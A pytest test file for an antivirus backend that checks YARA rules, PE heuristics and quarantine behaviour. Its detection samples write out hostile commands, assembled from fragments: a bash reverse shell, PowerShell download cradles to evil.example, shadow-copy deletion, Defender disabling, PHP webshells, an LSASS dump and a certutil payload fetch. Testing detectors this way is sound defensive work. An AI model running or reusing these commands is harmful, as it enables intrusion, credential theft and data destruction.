"""
Cyber Hub Backend - Part 8 tests: Rules Engine, Heuristics & Hash Lookup
Developed by Syed Muhammad Tayyab

* Rule samples run against BOTH backends: native libyara (if yara-python is
  installed) and the pure-Python YARA-lite engine - they must agree.
* Malicious-looking samples are analysed in memory (base64) wherever possible;
  tool names are assembled from hex at runtime so this file never trips an antivirus.
* Programs for the heuristics are real (tiny) PE files built by build_pe().
* Online lookups use a fake HTTP transport - no network, no real API keys.
"""
import base64
import hashlib
import io
import json
import os
import sqlite3
import struct
import time
import urllib.parse
import zipfile

import pytest
from fastapi.testclient import TestClient

from cyberhub.config import Settings
from cyberhub.database import MIGRATIONS, Database
from cyberhub.main import create_app
from cyberhub.services import yara_lite as L
from cyberhub.services.heuristics import HeuristicEngine, entropy, parse_pe
from cyberhub.services.platform_tools import CACHE

try:
    import yara  # noqa: F401
    HAVE_YARA = True
except Exception:                                   # pragma: no cover
    HAVE_YARA = False

PW = "Cyb3r!Hub#2026"
MARKER = b"CYBERHUB-RULES-" + b"ENGINE-TEST-STRING"
BACKENDS = ["lite"] + (["native"] if HAVE_YARA else [])


# ====================================================================== fixtures
@pytest.fixture()
def env(tmp_path, monkeypatch):
    for d in ("quick", "full", "watched", "work"):
        (tmp_path / d).mkdir()
    monkeypatch.setenv("CYBERHUB_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("CYBERHUB_UI_DIR", str(tmp_path / "no-ui"))
    monkeypatch.setenv("CYBERHUB_QUICK_SCAN_DIRS", str(tmp_path / "quick"))
    monkeypatch.setenv("CYBERHUB_FULL_SCAN_ROOTS", str(tmp_path / "full"))
    monkeypatch.setenv("CYBERHUB_AUTOSTART_USER_DIR", str(tmp_path / "as-user"))
    monkeypatch.setenv("CYBERHUB_AUTOSTART_SYSTEM_DIR", str(tmp_path / "as-sys"))
    monkeypatch.setenv("CYBERHUB_RTP_DEFAULT_DIRS", str(tmp_path / "watched"))
    return tmp_path


def _login(cl):
    cl.headers["X-CyberHub-Token"] = cl.get("/api/bootstrap").json()["token"]
    r = cl.post("/api/account/setup", json={"username": "syed", "display_name": "Syed", "password": PW})
    if r.status_code != 200:
        r = cl.post("/api/account/login", json={"username": "syed", "password": PW})
    cl.headers["X-CyberHub-Session"] = r.json()["session_token"]


@pytest.fixture(params=BACKENDS)
def backend(request, monkeypatch):
    monkeypatch.setenv("CYBERHUB_YARA_BACKEND", request.param)
    return request.param


@pytest.fixture()
def c(env):
    CACHE.clear()
    with TestClient(create_app(Settings(), start_workers=False)) as cl:
        _login(cl)
        yield cl
    CACHE.clear()


@pytest.fixture()
def cb(env, backend):
    """Client on a specific YARA backend."""
    CACHE.clear()
    with TestClient(create_app(Settings(), start_workers=False)) as cl:
        _login(cl)
        assert cl.app.state.rules.backend == backend
        yield cl
    CACHE.clear()


def wait_job(c, jid, timeout=30):
    end = time.time() + timeout
    while time.time() < end:
        j = c.get(f"/api/scan/jobs/{jid}").json()
        if j["status"] in ("completed", "cancelled", "failed"):
            return j
        time.sleep(0.05)
    raise AssertionError("scan did not finish")


def scan(c, *paths):
    j = c.post("/api/scan/custom", json={"paths": [str(p) for p in paths]}).json()
    return wait_job(c, j["id"])


def analyze(c, data: bytes, name: str):
    r = c.post("/api/rules/analyze", json={"content_base64": base64.b64encode(data).decode(), "name": name})
    assert r.status_code == 200, r.text
    return r.json()


def flags(rep):
    return {f["id"] for f in rep["heuristics"]["flags"]}


def standard_user(c):
    c.post("/api/account/users", json={"username": "guest1", "password": "Gu3st!Account#9", "role": "standard"})
    r = c.post("/api/account/login", json={"username": "guest1", "password": "Gu3st!Account#9"})
    return {"X-CyberHub-Session": r.json()["session_token"]}


# ====================================================================== tiny PE builder
def _align(n, a):
    return (n + a - 1) // a * a


def build_pe(sections, imports=None, entry=0, timestamp=1_700_000_000, cert=False, overlay=b"", dll=False):
    """sections: [(name, data, characteristics)]. imports: {dll: [func, ...]} -> extra .idata section."""
    FA, SA = 0x200, 0x1000
    secs = list(sections)
    nsec = len(secs) + (1 if imports else 0)
    hdr = _align(0x40 + 4 + 20 + 224 + 40 * nsec, FA)
    vas, va = [], SA
    for _, data, _ in secs:
        vas.append(va)
        va += _align(max(len(data), 1), SA)
    vas.append(va)                                            # .idata (if any) goes last
    idata = b""
    if imports:
        va = vas[-1]
        dlls = list(imports.items())
        desc = 20 * (len(dlls) + 1)
        pos = desc
        thunk_pos = []
        for _, funcs in dlls:
            thunk_pos.append(pos)
            pos += 4 * (len(funcs) + 1) * 2                    # OFT + FT
        blob = bytearray(pos)
        strings = bytearray()

        def add_str(b):
            off = pos + len(strings)
            strings.extend(b + b"\x00")
            return off
        for i, (dname, funcs) in enumerate(dlls):
            name_off = add_str(dname.encode())
            oft = thunk_pos[i]
            ft = oft + 4 * (len(funcs) + 1)
            struct.pack_into("<IIIII", blob, 20 * i, va + oft, 0, 0, va + name_off, va + ft)
            for k, fn in enumerate(funcs):
                hn = add_str(b"\x00\x00" + fn.encode())
                struct.pack_into("<I", blob, oft + 4 * k, va + hn)
                struct.pack_into("<I", blob, ft + 4 * k, va + hn)
        idata = bytes(blob) + bytes(strings)
        secs.append((b".idata", idata, 0xC0000040))
    raw, ptr, table = b"", hdr, b""
    for i, (name, data, ch) in enumerate(secs):
        rsize = _align(max(len(data), 1), FA)
        table += name.ljust(8, b"\x00")[:8] + struct.pack("<IIIIIIHHI", max(len(data), 1), vas[i], rsize, ptr,
                                                          0, 0, 0, 0, ch)
        raw += data.ljust(rsize, b"\x00")
        ptr += rsize
    opt = bytearray(224)
    struct.pack_into("<H", opt, 0, 0x10B)
    struct.pack_into("<I", opt, 16, vas[entry] if secs else 0)
    struct.pack_into("<III", opt, 28, 0x400000, SA, FA)
    struct.pack_into("<I", opt, 92, 16)
    if imports:
        struct.pack_into("<II", opt, 96 + 8, vas[-1], len(idata))
    body_end = hdr + len(raw) + len(overlay)
    certblob = b"\x00" * 64 if cert else b""
    if cert:
        struct.pack_into("<II", opt, 96 + 4 * 8, body_end, len(certblob))
    coff = struct.pack("<HHIIIHH", 0x14C, nsec, timestamp, 0, 0, 224, 0x2102 if dll else 0x102)
    dos = bytearray(0x40)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x40)
    head = bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + table
    return head.ljust(hdr, b"\x00") + raw + overlay + certblob


TEXT = 0x60000020          # code | execute | read
RDATA = 0x40000040
RWX = 0xE0000020


def normal_pe():
    code = (b"\x55\x8b\xec\x83\xec\x10\x33\xc0\x5d\xc3" * 300)
    return build_pe([(b".text", code, TEXT), (b".rdata", b"hello world\x00" * 50, RDATA)],
                    imports={"kernel32.dll": ["GetModuleHandleA", "ExitProcess", "CreateFileW", "ReadFile",
                                              "WriteFile", "CloseHandle", "GetLastError"],
                             "user32.dll": ["MessageBoxW", "CreateWindowExW"]})


def _noise(n, seed=b"cyberhub"):
    out, h = bytearray(), seed
    while len(out) < n:
        h = hashlib.sha256(h).digest()
        out += h
    return bytes(out[:n])


def packed_pe():
    return build_pe([(b"UPX0", b"", RWX), (b"UPX1", _noise(65536), RWX)],
                    imports={"kernel32.dll": ["LoadLibraryA", "GetProcAddress", "VirtualProtect"]}, entry=1)


def mark_encrypted(zbytes: bytes) -> bytes:
    """Python can't write encrypted zips - set the 'encrypted' flag bit in the headers instead."""
    b = bytearray(zbytes)
    for sig, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        i = b.find(sig)
        while i >= 0:
            b[i + off] |= 0x01
            i = b.find(sig, i + 4)
    return bytes(b)


# ====================================================================== status / self-test / info
def test_status_selftest_and_info(c):
    s = c.get("/api/rules/status").json()
    assert s["backend"]["name"] in ("native", "lite") and s["active_sets"] == 6 and s["active_rules"] >= 22
    assert s["settings"]["heuristics_sensitivity"] == "medium" and s["settings"]["heuristics_threshold"] == 60
    t = c.post("/api/rules/self-test").json()
    assert t["passed"] and all(t["checks"].values())
    st = c.post("/api/scan/self-test").json()
    assert st["passed"] and st["checks"]["yara_rules"] and st["checks"]["heuristics"]
    j = c.get("/api/info").json()
    assert j["build_part"] >= 8 and j["progress_percent"] >= 40 and "heuristics" in j["available_modules"]
    assert c.get("/api/health").json()["schema_version"] >= 9
    h = c.get("/api/rules/heuristics").json()
    assert h["thresholds"] == {"low": 80, "medium": 60, "high": 45} and len(h["checks"]) >= 40
    sets = c.get("/api/rules").json()["items"]
    assert all(x["origin"] == "builtin" and x["active"] for x in sets)
    assert any("PS_Download_Cradle" in x["rule_names"] for x in sets)


# ====================================================================== built-in rules, both engines
def J(*parts: bytes) -> bytes:
    """Samples are split into pieces and joined at runtime so this source file never looks like malware."""
    return b"".join(parts)


def _samples():
    dump = bytes.fromhex("73656b75726c73613a3a6c6f676f6e70617373776f726473") + b"\n" + \
        bytes.fromhex("70726976696c6567653a3a6465627567")
    lnk = (bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\x00" * 0x28 +
           struct.pack("<I", 7) + b"\x00" * 12 +
           "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\power".encode("utf-16le") +
           "shell.exe -nop -w hid".encode("utf-16le") + "den -c ie".encode("utf-16le") +
           "x(iwr http://evil.example/a)".encode("utf-16le"))
    rtf = J(b"{\\rt", b"f1{\\object\\objemb\\objupdate{\\*\\objclass Equa", b"tion.3}\\objdata 0105000002000000",
            b"0b0000004571756174696f6e2e3300000000000000000000", b"0" * 200, b"}}")
    return [
        ("marker.txt", b"x " + MARKER, "CyberHub_RulesEngine_TestFile", "low"),
        ("update.ps1", J(b"$u='http://x/a.ps1'; I", b"EX (New-Object Net.Web", b"Client).Download", b"String($u)"),
         "PS_Download_Cradle", "high"),
        ("run.bat", J(b"@echo off\r\npower", b"shell.exe -NoP -W Hidden -e", b"nc ") + b"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA" * 4,
         "PS_Encoded_Command_Launcher", "medium"),
        ("clean.bat", J(b"vssad", b"min.exe delete sha", b"dows /all /quiet\r\nwm", b"ic shadow", b"copy delete\r\n"),
         "Ransomware_Backup_Destruction", "critical"),
        ("off.ps1", J(b"Set-Mp", b"Preference -Disable", b"RealtimeMonitoring $true"), "Script_Defender_Tampering", "high"),
        ("shell.php", J(b"<?php @ev", b"al(base64_de", b"code($_PO", b"ST['z'])); ?>"), "PHP_Webshell_Eval_Obfuscated",
         "high"),
        ("cmd.php", J(b"<?php sys", b"tem($_G", b"ET['c']); ?>"), "PHP_Webshell_Command_Exec", "high"),
        ("config.json", J(b'{"url":"stra', b'tum+tcp://pool.example:3333","algo":"randomx","donate":"--donate-level=1"}'),
         "PUA_CoinMiner", "medium"),
        ("README.txt", J(b"All your files have been en", b"crypted! Send 0.1 bit", b"coin to decrypt them."),
         "Ransom_Note", "high"),
        ("a.hta", J(b"<html><hta:appli", b"cation/><script>new ActiveX", b"Object('WScript.", b"Shell').Run('calc')</script>"),
         "HTA_Script_Launcher", "high"),
        ("dump.bat", J(b"rundll32 C:\\windows\\system32\\comsv", b"cs.dll, Mini", b"Dump 624 C:\\t\\lsa", b"ss.dmp full"),
         "LSASS_Memory_Dump_Command", "high"),
        ("tool.txt", dump, "HackTool_Credential_Dumper", "high"),
        ("rev.sh", J(b"bash -i >& /dev/t", b"cp/10.0.0.1/4444 0>&1"), "Reverse_Shell_OneLiner", "high"),
        ("get.bat", J(b"certu", b"til.exe -url", b"cache -split -f http://x.example/p.exe p.exe"), "LOLBin_Remote_Payload",
         "medium"),
        ("invoice.lnk", lnk, "LNK_Script_Launcher", "medium"),
        ("doc.rtf", rtf, "RTF_Equation_Editor_Exploit", "high"),
    ]


@pytest.mark.parametrize("name,data,rule,sev", _samples(), ids=[s[2] for s in _samples()])
def test_builtin_rules_both_engines(cb, name, data, rule, sev):
    rep = analyze(cb, data, name)
    rules = [m["rule"] for m in rep["yara"]["matches"]]
    assert rule in rules, (rule, rules)
    assert rep["malicious"] and rep["verdict"]["method"] in ("yara", "hash")
    m = next(m for m in rep["yara"]["matches"] if m["rule"] == rule)
    assert m["severity"] == sev and m["set"].startswith("builtin/") and m["strings"]


def test_clean_files_have_no_rule_hits(cb):
    for name, data in [("notes.txt", b"Meeting at 10. Buy milk. Bitcoin is volatile.\n" * 50),
                       ("app.js", b"function add(a,b){return a+b}\nconsole.log(add(1,2));\n" * 100),
                       ("index.php", b"<?php echo htmlspecialchars($_GET['q'] ?? ''); ?>"),
                       ("build.ps1", b"Write-Host 'Building'; dotnet build -c Release\n"),
                       ("prog.exe", normal_pe())]:
        rep = analyze(cb, data, name)
        assert rep["yara"]["matches"] == [] and not rep["malicious"], (name, rep["yara"]["matches"],
                                                                       rep["heuristics"])


# ====================================================================== YARA-lite engine details
LITE_RULES = r'''
private rule IsMZ { condition: uint16(0) == 0x5A4D }
private global rule SmallOnly { condition: filesize < 1MB }
rule Hex_Features {
    meta: severity = "high" score = 7 flag = true
    strings:
        $h1 = { 4D 5A ?? 00 [2-4] ( AA | BB ) C? ~FF }
        $h2 = { DE AD BE EF }
    condition: IsMZ and $h1 and #h2 == 2 and @h2[2] > @h2[1] and $h2 in (0..100)
}
rule Text_Modifiers {
    strings:
        $a = "evil" nocase wide ascii
        $b = "word" fullword
        $c = /ab+c\d{2}/i
        $ = "anon"
    condition: all of them and $a at 0
}
rule Quantifiers {
    strings: $x1 = "one" $x2 = "two" $x3 = "three" $y = "zzz"
    condition: 2 of ($x*) and 50% of them and not $y and none of ($y)
}
rule Externals_And_Math {
    condition: extension == ".dat" and filename icontains "REPORT" and filepath endswith "report.dat"
               and (filesize \ 2) * 2 + (filesize % 2) == filesize and uint32be(0) == 0x4C495445
}
'''


def test_lite_engine_features():
    rules = L.compile_sources({"t": LITE_RULES}, {"filename": "", "filepath": "", "extension": ""})
    ext = {"filename": "x", "filepath": "x", "extension": ""}
    hexdata = b"MZ\x90\x00\x01\x02\x03\xAA\xC5\x00\xDE\xAD\xBE\xEF..\xDE\xAD\xBE\xEF"
    assert [m.rule for m in rules.match(hexdata, ext)] == ["Hex_Features"]
    m = rules.match(hexdata, ext)[0]
    assert m.meta == {"severity": "high", "score": 7, "flag": True}
    assert [m.rule for m in rules.match(b"MZ\x90\x00\x01\x02\xAA\xC5\xFF\xDE\xAD\xBE\xEF\xDE\xAD\xBE\xEF", ext)] == []
    txt = "EvIl".encode("utf-16le") + b" a word here ABBBC12 anon"
    assert "Text_Modifiers" in [m.rule for m in rules.match(txt, ext)]
    assert "Text_Modifiers" not in [m.rule for m in rules.match(txt.replace(b" word ", b" words "), ext)]
    assert [m.rule for m in rules.match(b"one two", ext)] == ["Quantifiers"]
    assert rules.match(b"one two zzz", ext) == [] and rules.match(b"one", ext) == []
    good = {"filename": "Q3-Report.dat", "filepath": "/home/s/report.dat", "extension": ".dat"}
    assert [m.rule for m in rules.match(b"LITE data", good)] == ["Externals_And_Math"]
    assert rules.match(b"LITE data", good | {"extension": ".txt"}) == []
    # global rule: nothing in the namespace matches once the file is too big
    assert rules.match(b"one two" + b"\x00" * (1024 * 1024), ext) == []


@pytest.mark.skipif(not HAVE_YARA, reason="yara-python not installed")
def test_lite_matches_native_yara():
    import yara
    ext = {"filename": "", "filepath": "", "extension": ""}
    lite = L.compile_sources({"t": LITE_RULES}, ext)
    native = yara.compile(sources={"t": LITE_RULES}, externals=ext)
    cases = [b"MZ\x90\x00\x01\x02\x03\xAA\xC5\x00\xDE\xAD\xBE\xEF..\xDE\xAD\xBE\xEF", b"one two", b"one two three",
             "EvIl".encode("utf-16le") + b" a word here ABBBC12 anon", b"evil word abc12 anon", b"", os.urandom(4096)]
    for data in cases:
        for e in (ext, {"filename": "Q3-Report.dat", "filepath": "/r/report.dat", "extension": ".dat"}):
            a = sorted(m.rule for m in lite.match(data, e))
            b = sorted(m.rule for m in native.match(data=data, externals=e))
            assert a == b, (data[:30], a, b)


def test_lite_errors_and_unsupported():
    with pytest.raises(L.LiteError) as e:
        L.compile_sources({"t": "rule a {\n strings: $a = \"x\"\n condition: $b }"})
    assert "line 3" in str(e.value) and "$b" in str(e.value)
    with pytest.raises(L.LiteError):
        L.compile_sources({"t": "rule a { condition: true } rule a { condition: true }"})
    with pytest.raises(L.LiteUnsupported):
        L.compile_sources({"t": 'import "pe"\nrule p { condition: pe.number_of_sections > 2 }'})
    with pytest.raises(L.LiteUnsupported):
        L.compile_sources({"t": 'rule x { strings: $a = "k" xor condition: $a }'})
    with pytest.raises(L.LiteUnsupported):
        L.compile_sources({"t": 'rule x { strings: $a = "k" condition: for any of them : ( $ at 0 ) }'})
    assert L.rule_names('rule a { condition: true }\n// rule fake\nprivate rule b { condition: "rule c" == "" }') \
        == ["a", "b"]


def test_lite_is_fast_on_large_files():
    import glob
    src = {os.path.basename(f): open(f).read() for f in glob.glob(
        os.path.join(os.path.dirname(L.__file__), "..", "rules", "*.yar"))}
    rules = L.compile_sources(src, {"filename": "", "filepath": "", "extension": ""})
    data = os.urandom(8 * 1024 * 1024)
    t = time.time()
    assert rules.match(data, {"filename": "x.bin", "filepath": "x.bin", "extension": ".bin"}) == []
    assert time.time() - t < 3.0


# ====================================================================== heuristics
def test_pe_parser_and_normal_program():
    pe = parse_pe(normal_pe())
    assert pe and pe["machine"] == "x86" and [s["name"] for s in pe["sections"]] == [".text", ".rdata", ".idata"]
    assert pe["imports"]["kernel32.dll"][:2] == ["GetModuleHandleA", "ExitProcess"] and pe["import_count"] == 9
    assert pe["entry_section"] == ".text" and pe["entry_section_executable"]
    rep = HeuristicEngine().analyze(normal_pe(), "tool.exe")
    assert rep["score"] == 0 and rep["file_type"] == "pe"
    assert parse_pe(b"MZ" + b"\x00" * 100) is None and parse_pe(b"not a program") is None


def test_packed_program_is_flagged(c):
    rep = analyze(c, packed_pe(), "setup.exe")
    f = flags(rep)
    assert {"packer_section", "high_entropy_code", "rwx_section", "few_imports", "dynamic_loader_only"} <= f
    assert rep["heuristics"]["score"] >= 80 and rep["verdict"]["threat_name"] == "Heuristic:Suspicious.PackedExecutable"
    assert rep["pe"]["sections"][1]["entropy"] > 7.5
    assert next(x for x in rep["heuristics"]["flags"] if x["id"] == "packer_section")["detail"] == "UPX"


def test_api_combinations(c):
    code = b"\x90" * 2000
    inj = build_pe([(b".text", code, TEXT)], imports={"kernel32.dll": [
        "OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "CloseHandle", "Sleep"]})
    rep = analyze(c, inj, "helper.exe")
    assert "injection_apis" in flags(rep) and rep["heuristics"]["score"] < 60 and not rep["malicious"]
    kl = build_pe([(b".text", code, TEXT)], imports={"user32.dll": [
        "SetWindowsHookExW", "CallNextHookEx", "GetForegroundWindow", "GetWindowTextW", "GetMessageW",
        "TranslateMessage"]})
    assert "keylogger_apis" in flags(analyze(c, kl, "kb.exe"))
    signed = build_pe([(b".text", code, TEXT)], imports={"kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory",
                                                                          "CreateRemoteThread", "Sleep", "ExitProcess"]},
                      cert=True)
    rep = analyze(c, signed, "signed.exe")
    assert "embedded_signature" in flags(rep) and rep["pe"]["has_certificate"]


def test_name_tricks(c):
    stub = normal_pe()
    rep = analyze(c, stub, "invoice.pdf.exe")
    assert "double_extension" in flags(rep) and not rep["malicious"]           # 55 < 60 at medium
    rep = analyze(c, stub, "invoice.pdf                    .exe")
    assert {"double_extension", "padded_extension"} <= flags(rep) and rep["malicious"]
    rep = analyze(c, stub, "holiday-photo.jpg")
    assert "disguised_executable" in flags(rep) and rep["verdict"]["threat_name"].endswith("DisguisedExecutable")
    rep = analyze(c, stub, "report\u202efdp.exe")
    assert "rtlo_name" in flags(rep) and rep["malicious"]
    assert analyze(c, b"plain text", "notes.txt")["heuristics"]["score"] == 0


def test_documents_shortcuts_archives_and_html(c):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"\x00Attribute VB_Name\x00Sub AutoOpen()\x00CreateObject(\"WScript.Shell\")")
    rep = analyze(c, buf.getvalue(), "Invoice.docm")
    assert {"office_macros", "office_autoexec", "office_macro_exec"} <= flags(rep)
    assert rep["verdict"]["threat_name"] == "Heuristic:Suspicious.MaliciousMacro"

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/_rels/settings.xml.rels",
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
                   'attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>')
    assert "office_remote_template" in flags(analyze(c, buf.getvalue(), "cv.docx"))

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("scan_0042.pdf.exe", b"MZ" + b"\x00" * 64)
    rep = analyze(c, mark_encrypted(buf.getvalue()), "scans.zip")
    assert {"archive_encrypted_exec", "archive_double_extension", "archive_single_exec"} <= flags(rep)
    assert rep["malicious"] and rep["verdict"]["threat_name"] == "Heuristic:Suspicious.SuspiciousArchive"

    payload = base64.b64encode(os.urandom(6000)).decode()
    html = (f"<html><script>var d=atob('{payload}');var u=new Uint8Array(d.length);var b=new Blob([u]);"
            "var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='inv.iso';a.click();"
            "</script></html>").encode()
    rep = analyze(c, html, "invoice.html")
    assert "html_smuggling" in flags(rep) and "HTML_Smuggling" in [m["rule"] for m in rep["yara"]["matches"]]

    url = b"[InternetShortcut]\r\nURL=file://\\\\203.0.113.5\\share\\update.exe\r\n"
    assert "url_remote_exec" in flags(analyze(c, url, "Update.url"))


def test_script_obfuscation(c):
    blob = base64.b64encode(os.urandom(900)).decode()
    ps = ("$s = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase" + f"64String('{blob}'))\n"
          "$a = 'Inv'+'oke'+'-Ex'+'pre'+'ssion'\n" + "$c = [char]73+[char]69+[char]88\n" * 8 +
          "power" + "shell -w hid" + "den -c $s\n").encode()
    rep = analyze(c, ps, "update.ps1")
    f = flags(rep)
    assert {"script_long_base64", "script_char_codes", "script_dynamic_exec", "script_hidden"} <= f
    assert rep["heuristics"]["score"] >= 60 and rep["heuristics"]["category"] == "ObfuscatedScript"


def test_entropy_helper():
    assert entropy(b"") == 0 and entropy(b"aaaa") == 0
    assert 7.9 < entropy(os.urandom(65536)) <= 8.0


# ====================================================================== scanner integration
def test_scan_records_yara_and_heuristic_detections(c, env):
    work = env / "work"
    (work / "marker.txt").write_bytes(b"test " + MARKER)
    (work / "invoice.pdf                    .exe").write_bytes(normal_pe())
    (work / "clean.txt").write_text("hello")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("docs/readme.txt", "hi")
        z.writestr("docs/marker.txt", b"zip " + MARKER)
    (work / "bundle.zip").write_bytes(buf.getvalue())
    j = scan(c, work)
    assert j["status"] == "completed" and j["threats_found"] == 3
    dets = c.get("/api/rules/detections").json()["items"]
    by = {(d["path"].rsplit(os.sep, 1)[-1], d["archive_member"]): d for d in dets}
    y = by[("marker.txt", None)]
    assert y["method"] == "yara" and y["severity"] == "low" and y["details"]["rule"] == "CyberHub_RulesEngine_TestFile"
    assert y["details"]["set"] == "builtin/selftest" and y["details"]["strings"][0]["id"] == "$marker"
    z = by[("bundle.zip", "docs/marker.txt")]
    assert z["method"] == "yara"
    h = by[("invoice.pdf                    .exe", None)]
    assert h["method"] == "heuristic" and h["threat_name"] == "Heuristic:Suspicious.DoubleExtension"
    assert h["details"]["score"] >= 60 and {f["id"] for f in h["details"]["flags"]} >= {"double_extension",
                                                                                       "padded_extension"}
    t = c.get(f"/api/threats/{y['id']}").json()
    assert "YARA rule CyberHub_RulesEngine_TestFile" in json.dumps(t)
    s = c.get("/api/rules/summary").json()
    assert sum(r["n"] for r in s["per_day"]) == 3 and s["by_severity"]["low"] == 2
    assert c.get("/api/scan/summary").json()["detections_by_method"] == {"yara": 2, "heuristic": 1}
    # second scan: verdicts come from the cache, nothing is analysed again
    insp = c.app.state.inspector
    before = dict(insp.stats)
    j2 = scan(c, work)
    assert j2["threats_found"] == 3
    assert insp.stats["analysed"] == before["analysed"] and insp.stats["cache_hits"] > before["cache_hits"]
    assert c.app.state.inspector.cache_size() >= 4


def test_settings_change_verdicts_and_cache(c, env):
    f = env / "work" / "report.pdf.exe"
    f.write_bytes(normal_pe())                                   # double extension only: score 55
    assert scan(c, f)["threats_found"] == 0
    assert c.patch("/api/settings", json={"heuristics_sensitivity": "high"}).status_code == 200
    assert scan(c, f)["threats_found"] == 1                     # 55 >= 45: new cache version, re-analysed
    c.patch("/api/settings", json={"heuristics_enabled": False})
    m = env / "work" / "m.txt"
    m.write_bytes(MARKER)
    j = scan(c, f, m)
    assert j["threats_found"] == 1
    c.patch("/api/settings", json={"yara_enabled": False})
    assert scan(c, m)["threats_found"] == 0
    assert c.delete("/api/rules/cache/verdicts").json()["deleted"] >= 1
    assert c.patch("/api/settings", json={"heuristics_sensitivity": "extreme"}).status_code == 422
    assert c.patch("/api/settings", json={"cloud_providers": ["virustotal", "evil"]}).status_code == 422
    assert c.patch("/api/settings", json={"rules_max_file_mb": 0}).status_code == 422
    std = standard_user(c)
    r = c.patch("/api/settings", json={"yara_enabled": True}, headers=std)
    assert r.status_code == 403


def test_allow_list_applies_to_rules_and_heuristics(c, env):
    f = env / "work" / "marker.txt"
    f.write_bytes(MARKER)
    c.post("/api/threats/allowed", json={"threat_name": "CyberHub-Rules-Test (not a threat)"})
    assert scan(c, f)["threats_found"] == 0
    g = env / "work" / "pic.jpg"
    g.write_bytes(normal_pe())
    j = scan(c, g)
    assert j["threats_found"] == 1
    c.post("/api/threats/allowed", json={"sha256": hashlib.sha256(normal_pe()).hexdigest()})
    assert scan(c, g)["threats_found"] == 0
    assert any(e["hits"] >= 1 for e in c.get("/api/threats/allowed").json()["items"])


def test_auto_quarantine_policy_and_heuristics(c, env):
    c.post("/api/rules", json={"name": "lab", "source":
           'rule Lab_High { meta: severity = "high" threat_name = "Trojan:Lab/High" '
           'strings: $a = "LAB-HIGH-SAMPLE-0001" condition: $a }'})
    c.patch("/api/settings", json={"scan_auto_quarantine": "all"})
    hi = env / "work" / "dropper.txt"
    hi.write_bytes(b"xx LAB-HIGH-SAMPLE-0001 xx")
    hx = env / "work" / "photo.jpg"
    hx.write_bytes(normal_pe())
    scan(c, hi, hx)
    assert not hi.exists()                                       # YARA high -> quarantined
    assert hx.exists()                                           # heuristic only -> waits for review
    d = c.get("/api/rules/detections?method=heuristic").json()["items"][0]
    assert d["status"] == "active"
    c.patch("/api/settings", json={"heuristics_auto_quarantine": True})
    c.delete("/api/rules/cache/verdicts")
    scan(c, hx)
    assert not hx.exists()


def test_realtime_uses_rules(c, env):
    rt = c.app.state.realtime
    rt.settle_seconds, rt.control_interval = 0.3, 0.2
    rt.drive_lister = lambda: []
    rt.start()
    (env / "watched" / "marker.txt").write_bytes(b"new " + MARKER)
    (env / "watched" / "photo.jpg").write_bytes(normal_pe())

    def events():
        return {e["path"].rsplit(os.sep, 1)[-1]: e for e in
                c.get("/api/realtime/events?limit=50").json()["items"] if e["status"] == "infected"}
    end = time.time() + 15
    while time.time() < end and len(events()) < 2:
        time.sleep(0.1)
    ev = events()
    assert ev["marker.txt"]["action"] == "quarantined" and ev["marker.txt"]["threat_name"].startswith("CyberHub-Rules")
    assert ev["photo.jpg"]["action"] == "alerted" and ev["photo.jpg"]["reason"] == "heuristic_review"
    assert not (env / "watched" / "marker.txt").exists() and (env / "watched" / "photo.jpg").exists()


# ====================================================================== rule management
def test_rule_set_crud(c):
    good = 'rule My_Rule { meta: severity = "critical" strings: $a = "MY-SECRET-IOC" condition: $a }'
    r = c.post("/api/rules", json={"name": "Incident 42", "source": good})
    assert r.status_code == 201
    s = r.json()
    assert s["active"] and s["rule_count"] == 1 and s["rule_names"] == ["My_Rule"] and s["origin"] == "user"
    assert c.post("/api/rules", json={"name": "incident 42", "source": good}).status_code == 409
    bad = c.post("/api/rules", json={"name": "broken", "source": "rule x {\n condition: $nope\n}"})
    assert bad.status_code == 422 and bad.json()["detail"]["line"] in (2, 3)     # libyara reports the closing line
    v = c.post("/api/rules/validate", json={"source": "rule y { condition: true }"}).json()
    assert v["valid"] and v["rules"] == ["y"]
    assert analyze(c, b"..MY-SECRET-IOC..", "x.bin")["verdict"]["severity"] == "critical"
    p = c.patch(f"/api/rules/{s['id']}", json={"enabled": False}).json()
    assert not p["active"]
    assert analyze(c, b"..MY-SECRET-IOC..", "x.bin")["verdict"] is None
    p = c.patch(f"/api/rules/{s['id']}", json={"enabled": True, "name": "Incident 42b",
                                                "source": good.replace("MY-SECRET-IOC", "OTHER-IOC")}).json()
    assert p["name"] == "Incident 42b" and "OTHER-IOC" in c.get(f"/api/rules/{s['id']}").json()["source"]
    builtin = next(x for x in c.get("/api/rules").json()["items"] if x["origin"] == "builtin")
    assert c.patch(f"/api/rules/{builtin['id']}", json={"source": "rule z { condition: true }"}).status_code == 403
    assert c.delete(f"/api/rules/{builtin['id']}").status_code == 403
    assert c.patch(f"/api/rules/{builtin['id']}", json={"enabled": False}).json()["enabled"] is False
    assert c.post("/api/rules", json={"name": "builtin/x", "source": good}).status_code == 422
    std = standard_user(c)
    assert c.get("/api/rules", headers=std).status_code == 200
    assert c.post("/api/rules", json={"name": "n", "source": good}, headers=std).status_code == 403
    assert c.post("/api/rules/analyze", json={"content_base64": "aGk=", "name": "a.txt"}, headers=std).status_code == 200
    assert c.delete(f"/api/rules/{s['id']}").json()["deleted"] == 1
    assert c.get(f"/api/rules/{s['id']}").status_code == 404


def test_import_folder_and_zip(c, env):
